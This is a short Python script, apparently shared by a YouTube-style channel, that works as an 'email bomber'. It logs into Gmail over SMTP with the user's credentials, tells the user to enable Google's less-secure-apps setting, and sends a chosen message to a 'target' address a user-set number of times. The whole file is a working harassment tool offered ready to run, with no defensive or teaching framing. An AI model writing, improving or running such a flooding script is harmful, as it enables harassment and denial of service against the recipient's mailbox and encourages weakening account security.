import smtplib
banner = """
+++++++++++++++++++++++++++++++++++++++++++
|       Author : Harsh Mishra             |
|       Channel : harsh ki vani           |
+++++++++++++++++++++++++++++++++++++++++++

        Enable the permissin here 
https://myaccount.google.com/lesssecureapps
"""
print(banner,'\n')
sender_email = input("Enter your email id: ")
password = input("Enter your password: ")
rec_email = input("Enter the target's email id: ") 
message = input("Enter a message for your target\n \n")
bombsize = input("Enter the bomb size: ")
print(bombsize)
i = 0
agree = input("Are you sure: ") 
if agree.lower() == 'y':
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(sender_email,password)
    print(" [ + ]Authenticating........")
    print(f"{bombsize} 💣 have been launched ")
    while i != int(bombsize):
        server.sendmail(sender_email, rec_email, message)
        print(f"{i+1} Bomb 💥")
        i += 1
else:
    exit()